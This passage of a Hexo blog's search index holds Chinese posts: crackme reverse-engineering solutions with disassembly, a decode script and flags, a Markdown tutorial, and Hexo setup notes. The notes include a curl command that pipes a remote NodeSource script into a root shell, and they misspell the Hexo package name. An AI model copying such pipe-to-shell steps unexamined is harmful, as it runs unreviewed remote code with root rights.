 shl     edx, 2</span><br><span class="line">0040109A  or      eax, edx</span><br><span class="line">0040109C  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">0040109F  mov     byte ptr [ecx+42CC9C], al</span><br><span class="line">004010A5  jmp     short 00401058</span><br><span class="line">004010A7  mov     dword ptr [ebp-4], 0</span><br><span class="line">004010AE  jmp     short 004010B9</span><br><span class="line">004010B0  mov     edx, dword ptr [ebp-4]</span><br><span class="line">004010B3  add     edx, 1</span><br><span class="line">004010B6  mov     dword ptr [ebp-4], edx</span><br><span class="line">004010B9  mov     eax, dword ptr [ebp-4]</span><br><span class="line">004010BC  cmp     eax, dword ptr [ebp-8]</span><br><span class="line">004010BF  jge     short 004010DD</span><br><span class="line">004010C1  mov     ecx, dword ptr [ebp-4]</span><br><span class="line">004010C4  movsx   edx, byte ptr [ecx+42CC9C]</span><br><span class="line">004010CB  mov     eax, dword ptr [ebp-4]</span><br><span class="line">004010CE  movsx   ecx, byte ptr [eax+429A30]</span><br><span class="line">004010D5  cmp     edx, ecx</span><br><span class="line">004010D7  je      short 004010DB</span><br><span class="line">004010D9  jmp     short 004010DD</span><br><span class="line">004010DB  jmp     short 004010B0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上为异常处理函数的主要处理逻辑，将0x42CC9C处字符串每一字符依次取出，将该字符的第四第三位和第二第一位对调，即若原字符为x<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>3</sub>x<sub>2</sub>x<sub>1</sub>x<sub>0</sub>，则现在的字符为x<sub>7</sub>x<sub>6</sub>x<sub>5</sub>x<sub>4</sub>x<sub>1</sub>x<sub>0</sub>x<sub>3</sub>x<sub>2</sub>。<br>之后将转换后的字符串与0x429A30处字符串进行比较，该字符串为<code>\eluxfqvF|Puzzce</code><br>求解脚本如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> a[] = <span class="string">&quot;\\eluxfqvF|Puzzce&quot;</span>;</span><br><span class="line">   <span class="type">char</span> b,c,d;</span><br><span class="line">   <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">15</span>;i++)&#123;</span><br><span class="line">   b = a[i] &amp; <span class="number">240</span>;</span><br><span class="line">    c = (a[i] &amp; <span class="number">12</span>)&gt;&gt;<span class="number">2</span>;</span><br><span class="line">    d = (a[i] &amp; <span class="number">3</span>)&lt;&lt;<span class="number">2</span>;</span><br><span class="line">    a[i] = b | c | d;</span><br><span class="line">    </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>求解得到结果<code>SecurityIsPuzzle</code>，在该字符串后任意添加两个字符即为flag。<br><img src="2022-07-15%20190714.jpg" alt="res"></p><h2 id="cpp-3">cpp.3</h2><p>使用IDA进行分析，在只读数据段发现如下数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0042805C dword_42805C    dd 0D76AA478h</span><br><span class="line">.rdata:00428060 dword_428060    dd 0E8C7B756h</span><br><span class="line">.rdata:00428064 dword_428064    dd 242070DBh</span><br><span class="line">.rdata:00428068 dword_428068    dd 0C1BDCEEEh</span><br><span class="line">.rdata:0042806C dword_42806C    dd 0F57C0FAFh</span><br><span class="line">.rdata:00428070 dword_428070    dd 4787C62Ah</span><br><span class="line">.rdata:00428074 dword_428074    dd 0A8304613h</span><br></pre></td></tr></table></figure><p>一眼MD5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     edx, [ebp+var_430]</span><br><span class="line">movsx   eax, [ebp+edx+var_424]</span><br><span class="line">cmp     eax, 61h</span><br><span class="line">jl      short loc_401195</span><br><span class="line">mov     ecx, [ebp+var_430]</span><br><span class="line">movsx   edx, [ebp+ecx+var_424]</span><br><span class="line">cmp     edx, 7Ah</span><br><span class="line">jle     short loc_4011AA</span><br></pre></td></tr></table></figure><p>要求输入范围在a-z。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmp     [ebp+var_434], 5    ;var_434中存储了输入字符串的长度</span><br><span class="line">jnb     short loc_4011C4</span><br></pre></td></tr></table></figure><p>要求输入长度为5。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">push    4</span><br><span class="line">lea     eax, [ebp+var_424]          ;var_42C中存储输入的字符串</span><br><span class="line">push    eax             ; char *</span><br><span class="line">lea     ecx, [ebp+var_42C]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strncpy</span><br><span class="line">push    4               ; int</span><br><span class="line">lea     edx, [ebp+var_42C]</span><br><span class="line">push    edx             ; int</span><br><span class="line">lea     eax, [ebp+var_24]</span><br><span class="line">push    eax             ; char *</span><br><span class="line">call    sub_401014</span><br></pre></td></tr></table></figure><p>是将输入串的前四个字节进行处理，sub_401014为加密函数。<br>加密后的字符串与&quot;b5c0b187fe309af0f4d35982fd961d7e&quot;进行比较。<br>我们使用脚本对该字符串进行求解，得到对应的明文为<code>love</code>，需要在后面添加任意一个小写字母。<br><img src="2022-07-15%20200510.jpg" alt="res"></p><h2 id="cpp-4">cpp.4</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_7C]</span><br><span class="line">movsx   edx, [ebp+ecx+var_70]</span><br><span class="line">cmp     edx, 41h</span><br><span class="line">jl      short loc_4010B7</span><br><span class="line">mov     eax, [ebp+var_7C]</span><br><span class="line">movsx   ecx, [ebp+eax+var_70]</span><br><span class="line">cmp     ecx, 5Ah</span><br><span class="line">jle     short loc_4010CC</span><br></pre></td></tr></table></figure><p>可知输入的字符串要求全为大写字母，即A-Z。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_7C]</span><br><span class="line">movsx   edx, [ebp+ecx+var_70]</span><br><span class="line">sub     edx, 41h</span><br><span class="line">mov     [ebp+var_74], edx</span><br><span class="line">mov     eax, [ebp+var_74]</span><br><span class="line">imul    eax, [ebp+var_4]</span><br><span class="line">add     eax, [ebp+var_8]</span><br><span class="line">cdq</span><br><span class="line">mov     ecx, 1Ah</span><br><span class="line">idiv    ecx</span><br><span class="line">mov     [ebp+var_74], edx</span><br><span class="line">mov     edx, [ebp+var_74]</span><br><span class="line">add     edx, 41h</span><br><span class="line">mov     eax, [ebp+var_7C]</span><br><span class="line">mov     [ebp+eax+var_70], dl</span><br><span class="line">jmp     short loc_4010D7</span><br></pre></td></tr></table></figure><p>由上述处理过程可知，将输入字符串每一字节减去0x41后与var_4进行相乘，再与var_8进行相加，再与26（0x1A）进行相除，取余（idiv命令中所得结果存在eax中，余数存于edx中），一眼仿射加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov     [ebp+var_4], 9</span><br><span class="line">mov     [ebp+var_8], 7</span><br></pre></td></tr></table></figure><p>加密所得结果与&quot;SHUJDU&quot;进行比较。9模26的逆元为3。求得flag为<code>HANGON</code>。</p><h2 id="cpp-5">cpp.5</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">lea     eax, [ebp+var_20]</span><br><span class="line">push    eax</span><br><span class="line">push    offset aS       ; &quot;%s&quot;</span><br><span class="line">call    _scanf</span><br><span class="line">add     esp, 8</span><br><span class="line">lea     ecx, [ebp+var_20]</span><br><span class="line">push    ecx             ; char *</span><br><span class="line">call    _strlen</span><br><span class="line">add     esp, 4</span><br><span class="line">cmp     eax, 8</span><br><span class="line">jz      short loc_40111D</span><br></pre></td></tr></table></figure><p>要求明文长度为8字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rdata:004280CC byte_4280CC     db  10h</span><br><span class="line">.rdata:004280CD                 db    7</span><br><span class="line">.rdata:004280CE                 db  14h</span><br><span class="line">.rdata:004280CF                 db  15h</span><br><span class="line">.rdata:004280D0                 db  1Dh</span><br><span class="line">.rdata:004280D1                 db  0Ch</span><br><span class="line">.rdata:004280D2                 db  1Ch</span><br><span class="line">.rdata:004280D3                 db  11h</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov     eax, [ebp+var_24]</span><br><span class="line">movsx   ecx, ds:byte_4280CC[eax]</span><br><span class="line">mov     edx, [ebp+arg_4]</span><br><span class="line">add     edx, [ebp+var_24]</span><br><span class="line">mov     al, byte ptr [ebp+ecx+var_24+3]</span><br><span class="line">mov     [edx], al</span><br><span class="line">jmp     short loc_4018D3</span><br></pre></td></tr></table></figure><p>由上可知，这是DES算法的P置换，该算法为DES。也可以根据<code>sub_401C10</code>函数得到该函数是DES轮密钥的产生过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DES的初始密钥为0x54,0x61,0x6B,0x65,0x45,0x61,0x73,0x79</span><br><span class="line">加密所得的密文应该是0x28,0x70,0x77,0x48,0x7B,0x4F,0xFF,0x3D</span><br></pre></td></tr></table></figure><p>求得flag为<code>itiseasy</code>。</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本用法</title>
      <link href="/2022/07/b/"/>
      <url>/2022/07/b/</url>
      
        <content type="html"><![CDATA[<h2 id="编辑工具">编辑工具</h2><h3 id="Typora">Typora</h3><p>好用，目前收费，但可以白嫖（乐），具体下载地址请自行百度。还是推荐大家支持正版（叠甲）。</p><h3 id="Visual-Studio-Code">Visual Studio Code</h3><p><s>目前在用</s>，需要下载插件：</p><ul><li>Markdown All in One</li><li>Markdown Preview Enhanced</li></ul><h3 id="Obsdian">Obsdian</h3><p>用起来比较舒服。也是常用工具</p><blockquote><p>不止于Markdown，后续应该会开个坑说说这个工具（应该，咕咕咕）</p></blockquote><h3 id="Notion">Notion</h3><p>原生支持Markdown，界面很简洁。且拥有很多强大的模板和功能<br>缺点：</p><ul><li>因为是上云的，且服务器在国外，所以打开比较慢（虽然我觉得速度还是可以接受）</li><li>数据可能会丢失 <s>(备份一下就好了)</s></li></ul><blockquote><p>很重要，一定要备份。一是云上数据确实有丢失风险，二是notion目前已经禁止了在俄罗斯境内的服务，也许有一天我们也用不了（希望这一天不会到来，不过局势如此，有时候也是没办法的事）。记住一点，把鸡蛋放在一个篮子里是不明智的。</p></blockquote><blockquote><p>TODO-List: 因为最近组里要求使用这个工具，后续可能会学习一下这个工具的使用（咕咕咕）</p></blockquote><h2 id="基本语法">基本语法</h2><p>基本语法使用几次就会了，虽然有学习成本，但总体来说比较容易。</p><h3 id="标题">标题</h3><p>使用<code>#</code>表示1-6级标题<br>不要忘了加空格，后同。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 一级标题</span></span><br><span class="line"><span class="section">## 二级标题</span></span><br><span class="line"><span class="section">### 三级标题</span></span><br><span class="line"><span class="section">#### 四级标题</span></span><br><span class="line"><span class="section">##### 五级标题</span></span><br><span class="line"><span class="section">###### 六级标题</span></span><br></pre></td></tr></table></figure><h3 id="区块">区块</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; 这是一个区块</span></span><br></pre></td></tr></table></figure><p>效果</p><blockquote><p>这是一个区块</p></blockquote><p>也可以嵌套</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt; 第一层</span></span><br><span class="line"><span class="quote">&gt; &gt; 第二层</span></span><br></pre></td></tr></table></figure><p>效果</p><blockquote><p>第一层</p><blockquote><p>第二层</p></blockquote></blockquote><h3 id="列表">列表</h3><p>可以使用序号或<code>-</code>表示列表</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 1</span><br><span class="line"><span class="bullet">2.</span> 2</span><br><span class="line"><span class="bullet">3.</span> 3</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> 1</span><br><span class="line"><span class="bullet">-</span> 2</span><br><span class="line"><span class="bullet">-</span> 3</span><br></pre></td></tr></table></figure><p>效果</p><ol><li>1</li><li>2</li><li>3</li></ol><ul><li>1</li><li>2</li><li>3</li></ul><h3 id="代码块">代码块</h3><p>代码区块可以使用<code>```</code>将其包裹起来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="code">```c</span></span><br><span class="line"><span class="code">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="code">int main()&#123;</span></span><br><span class="line"><span class="code">    printf(&quot;Hello World\n&quot;);</span></span><br><span class="line"><span class="code">    return 0;</span></span><br><span class="line"><span class="code">&#125;```</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>行内代码块可以使用`包裹<br>如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">`printf`</span></span><br></pre></td></tr></table></figure><p>效果<br><code>printf</code></p><h3 id="数学公式">数学公式</h3><p>行内使用<code>$</code>，公式块使用<code>$$</code>，Markdown一般使用KaTex或MathJax进行渲染，具体的语法请自行查阅。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\frac&#123;\partial f&#125;&#123;\partial x&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>效果</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>f</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>x</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial f}{\partial x}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.0574em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3714em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">x</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><h3 id="表格">表格</h3><p>使用<code>|</code>来分隔不同的单元格，使用<code>-</code>来分割表头与表项。</p><p>冒号在左边表示左对齐，右边为右对齐，两边都有为中间对齐。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|a|b|c</span><br><span class="line">|:---|---:|:---:|</span><br><span class="line">|ABC|1|2|</span><br><span class="line">|abc|0|1|</span><br></pre></td></tr></table></figure><p>效果</p><table><thead><tr><th style="text-align:left">a</th><th style="text-align:right">b</th><th style="text-align:center">c</th></tr></thead><tbody><tr><td style="text-align:left">ABC</td><td style="text-align:right">1</td><td style="text-align:center">2</td></tr><tr><td style="text-align:left">abc</td><td style="text-align:right">0</td><td style="text-align:center">1</td></tr></tbody></table><h3 id="分割线">分割线</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">---</span><br></pre></td></tr></table></figure><p>效果</p><hr><h3 id="链接">链接</h3><p>使用方式</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">链接名称</span>](<span class="link">链接地址</span>)</span><br></pre></td></tr></table></figure><p>效果<br><a href="www.baidu.com">百度</a></p><h3 id="一些其他用法">一些其他用法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="emphasis">*斜体文本*</span></span><br><span class="line"><span class="strong">**粗体文本**</span></span><br><span class="line"><span class="strong">**<span class="emphasis">*粗斜体文本*</span>**</span></span><br><span class="line">~~删除线~~</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>带下划线文本<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line">2<span class="language-xml"><span class="tag">&lt;<span class="name">sup</span>&gt;</span></span>10<span class="language-xml"><span class="tag">&lt;/<span class="name">sup</span>&gt;</span></span></span><br><span class="line">H<span class="language-xml"><span class="tag">&lt;<span class="name">sub</span>&gt;</span></span>2<span class="language-xml"><span class="tag">&lt;/<span class="name">sub</span>&gt;</span></span>O</span><br></pre></td></tr></table></figure><p>其中上下标和下划线使用的是嵌入的html语句。<br>效果<br><em>斜体文本</em><br><strong>粗体文本</strong><br><em><strong>粗斜体文本</strong></em><br><s>删除线</s><br><u>带下划线文本</u></p><p>2<sup>10</sup><br>H<sub>2</sub>O</p><h3 id="嵌入html-css或javascript">嵌入html,css或javascript</h3><p>Markdown支持嵌入html,css或javascript。</p><h3 id="转义">转义</h3><p>Markdown使用了很多特殊符号来表示特定的意义，如果需要显示特定的符号则需要使用转义字符，Markdown使用反斜杠转义特殊字符。<br>Markdown支持以下这些符号前面加上反斜杠以表示插入普通的符号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line">*   星号</span><br><span class="line">_   下划线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  小括号</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line">-   减号</span><br><span class="line">.   英文句点</span><br><span class="line">!   感叹号</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客撰写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 博客撰写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/07/hello-world/"/>
      <url>/2022/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><hr><p>更新于2023.11.24 <s>（虽然上面有更新时间）</s>(不准，还是看这个吧)</p><h2 id="环境安装">环境安装</h2><p>正好装了台新电脑，环境还是要配的。</p><h3 id="Windows">Windows</h3><p>懒了。<br>确切来说前几天帮人做了个nodejs做的electron项目，结果环境怎么都配不好（悲），遂放弃在Windows上继续折腾nodejs的想法。</p><h3 id="MacOS">MacOS</h3><p>没有，如果有好心人v我一个就试试</p><h3 id="Linux（Ubuntu）">Linux（Ubuntu）</h3><p>因为现代Linux发行版强大的包管理器（如apt,pacman），所以在Linux上配置环境相对来说是一件比较舒服的事情。Linux虚拟机折腾崩了还可以直接回滚。<br>主要是折腾了一下Ubuntu（其他发行版懒得试了，除非我以后有想法换主力操作系统。btw，如果我想换主力操作系统，为什么不用Mac？）</p><h3 id="1-安装nodejs">1.安装nodejs</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install npm</span><br><span class="line">curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &amp;&amp;\</span><br><span class="line">sudo apt install nodejs</span><br></pre></td></tr></table></figure><p>这是比较简单的安装方法，也可以参考网上的方法安装较新版本的。不过我一般是能偷懒就偷懒，所以这儿照例就偷个小懒了。</p><h3 id="2-安装hexo">2.安装hexo</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cil</span><br></pre></td></tr></table></figure><p>这之后使用官方给出的命令进行测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>看到这个就成了<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-24%20180738.png" alt="效果"></p><h3 id="3-配置主题">3.配置主题</h3><p>懒了，根据官方文档和自己喜好配置即可。</p><h3 id="4-使用">4.使用</h3><p>怎么用？<br>Vscode ssh的功能是很完善的，下载插件直接用就好了。<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-11-24%20175122.png" alt="插件商店"><br>Ubuntu下下载并启动ssh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p>之后连接过程与ssh连接一致。</p><h3 id="5-部署到github">5.部署到github</h3><p>效果：这个页面就是效果</p>]]></content>
      
      
      <categories>
          
          <category> 博客撰写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
            <tag> 博客撰写 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
